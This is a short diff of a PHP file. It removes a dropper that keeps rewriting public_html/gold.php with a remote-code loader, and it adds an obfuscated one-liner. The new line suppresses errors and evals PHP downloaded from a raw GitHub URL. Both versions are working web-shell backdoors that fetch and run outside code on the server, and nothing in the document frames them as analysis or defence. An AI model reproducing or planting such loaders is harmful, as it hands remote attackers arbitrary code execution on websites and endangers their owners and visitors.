@@ -1,9 +1,1 @@
-<?php
-$target = __DIR__ . "/public_html/gold.php";
-$payload = "<?=@eval(\"?>\".file_get_contents(\"https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/gecko.php\"));?>";
-
-// Jika file tidak ada atau dihapus
-if (!file_exists($target) || strpos(file_get_contents($target), 'gecko.php') === false) {
-    file_put_contents($target, $payload);
-}
-?>
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpa2.txt"))?>
